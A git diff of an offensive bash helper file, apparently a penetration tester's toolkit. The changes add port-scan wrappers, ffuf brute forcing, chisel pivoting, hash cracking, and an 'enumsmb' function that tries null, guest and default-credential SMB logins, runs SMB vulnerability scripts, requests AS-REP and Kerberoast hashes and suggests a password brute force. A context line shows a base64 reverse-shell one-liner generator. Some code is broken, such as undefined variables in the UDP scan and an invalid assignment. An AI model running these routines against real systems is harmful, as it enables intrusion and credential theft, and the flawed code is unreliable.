@@ -140,13 +140,22 @@ bashrev() {
   echo "echo '$b64' | base64 -d | bash"
 }
 
-# Port SCan
-psc() {
-  [ "$1" = "" ] && echo "Usage: psc <ip>" && return
-  echo "Executing and copied to clipboard:"
-  echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan"
-  echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan" | xclip -selection clipboard
-  mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan
+# Port Scan Tcp 
+pst() {
+  [ "$1" = "" ] && echo "Usage: pst <ip>" && return
+  echo "Executing the following command and copied to clipboard:"
+  echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan-tcp"
+  echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan-tcp" | xclip -selection clipboard
+  mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan-tcp
+}
+
+# Port Scan Udp
+psu() {
+  [ "$1" = "" ] && echo "Usage: psu <ip>" && return
+  echo "Executing the following command and copied to clipboard:"
+  echo "mkdir -p nmap-$1 && nmap -v -Pn -sU --max-retries 1 --max-scan-delay 1 --version-intensity 0 "$r1" -oA nmap-$rhost/top1000-udp"
+  echo "mkdir -p nmap-$1 && nmap -v -Pn -sU --max-retries 1 --max-scan-delay 1 --version-intensity 0 "$r1" -oA nmap-$rhost/top1000-udp" | xclip -selection clipboard
+  mkdir -p nmap-$1 && nmap -v -Pn -sU --max-retries 1 --max-scan-delay 1 --version-intensity 0 -oA nmap-$rhost/top1000-udp "$1"
 }
 
 # NIKto
@@ -166,7 +175,7 @@ srh() {
 
 # FFuf Web bruteforce
 ffw() {
-  [ "$3" = "" ] && echo "Usage: ffw <http/https> <domain/ip> <port> [other ffuf params]" && return
+  [ "$3" = "" ] && echo "Usage: ffw <http/https> <domain/ip> <port/dir> [other ffuf params]" && return
   proto="$1"
   ressource="$2"
   port="$3"
@@ -180,7 +189,7 @@ ffw() {
 
 # FFuf Vhost bruteforce
 ffv() {
-  [ "$3" = "" ] && echo "Usage: ffv <http/https> <domain> <port> <filter_size> [other ffuf params]" && return
+  [ "$3" = "" ] && echo "Usage: ffv <http/https> <domain> <port/dir> <filter_size> [other ffuf params]" && return
   [ "$4" = "" ] && 4="99999999"
   proto="$1"
   ressource="$2"
@@ -279,7 +288,7 @@ shb() {
 
 # CHIsel connection
 chi() {
-  [ "$1" == "" ] && echo "Usage: chi <port from victim>" && return
+  [ "$1" = "" ] && echo "Usage: chi <port from victim>" && return
   rport="$1"
   lhost_port="9999"
   address="$(interfaceip)"
@@ -303,7 +312,7 @@ chi() {
 
 # Python Virtual Env
 pve() {
-  [ "$1" == "" ] && echo "Usage: pve <virtual env name>" && return
+  [ "$1" = "" ] && echo "Usage: pve <virtual env name>" && return
   python3 -m venv "$1"
   source "$1/bin/activate"
   echo 'Run "deactivate" to exit virtual env'
@@ -311,8 +320,57 @@ pve() {
 
 # CRack Hash
 crh() {
-  [ "$1" == "" ] && echo "Usage: cha <path to file with hash>" && return
+  [ "$1" = "" ] && echo "Usage: cha <path to file with hash>" && return
   nth --no-banner --file "$1"
   echo "Crack with hashcat:"
   echo "hashcat \"$1\" /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
+}
+
+enumsmb() {
+  [ "$1" = "" ] && echo "Usage: enumsmb <ip> [domain]" && return
+  users=",nobody,admin,administrator,root"
+  echo "Running: nbtscan \"$1\""
+  nbtscan "$1"
+  echo "Running: smbmap -H \"$1\""
+  smbmap -H "$1"
+  echo "Running: smbmap -H \"$1\" -u null -p null"
+  smbmap -H "$1" -u null -p null
+  echo "Running: smbmap -H \"$1\" -u guest"
+  smbmap -u guest -H "$1"
+  echo "Running: crackmapexec smb \"$1\"" || true
+  crackmapexec smb "$1"
+  echo "Running: rpcclient \"$1\""
+  rpcclient "$1"
+  echo "$users" | tr "," "\n" | xargs -I '{}' sh -c \ 
+    "echo \"Running: smbmap -u '{}' -p '' -H \"$1\"\"; \
+    smbmap -u '{}' -p '' -H \"$1\"; \
+    echo \"Running: smbmap -u '{}' -p '{}' -H \"$1\"\"; \
+    smbmap -u '{}' -p '{}' -H \"$1\"; \
+    echo \"Running: crackmapexec smb \"$1\" --pass-pol -u '{}' -p ''\"; \
+    crackmapexec smb \"$1\" --pass-pol -u '{}' -p '' 2>/dev/null; \
+    echo \"Running: crackmapexec smb \"$1\" --pass-pol -u '{}' -p '{}'\"; \
+    crackmapexec smb \"$1\" --pass-pol -u '{}' -p '{}' 2>/dev/null; \
+    echo \"Running: rpcclient -U '{}' \"$1\"\"; rpcclient -U '{}' \"$1\""
+  echo "Running: smbclient -N -L //\"$1\""
+  smbclient -N -L //"$1"
+  echo "Running: smbclient -N //\"$1\"/ --option=\"client min protocol\"=LANMAN1"
+  smbclient -N //"$1"/ --option="client min protocol"=LANMAN1
+  echo "Running: impacket-getArch -target \"$1\""
+  impacket-getArch -target "$1"
+  echo "Running: enum4linux-ng.py -a \"$1\""
+  enum4linux-ng.py -A "$1"
+  echo "Running: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse \"$1\""
+  nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse "$1"
+  echo "Running: nmap --script smb-vuln* -Pn -p 139,445 \"$1\""
+  nmap --script smb-vuln* -Pn -p 139,445 "$1"
+  if [ ! "$2" = "" ]; then 
+    echo "Running: impacket-GetADUsers -dc-ip \"$1\" \"$2/\" -all"
+    impacket-GetADUsers -dc-ip "$1" "$2/" -all
+    echo "Running: impacket-GetNPUsers -dc-ip \"$1\" -request \"$2/\" -format hashcat"
+    impacket-GetNPUsers -dc-ip "$1" -request "$2/" -format hashcat
+    echo "Running: impacket-GetUserSPNs -dc-ip \"$1\" -request \"$2/\""
+    impacket-GetUserSPNs -dc-ip "$1" -request "$2/"
+  fi
+  echo "Do you want to bruteforce via SMB?"
+  echo "crackmapexec smb \"$1\" -u pot-user.txt -p pot-passwords.txt --continue-on-success"
 }
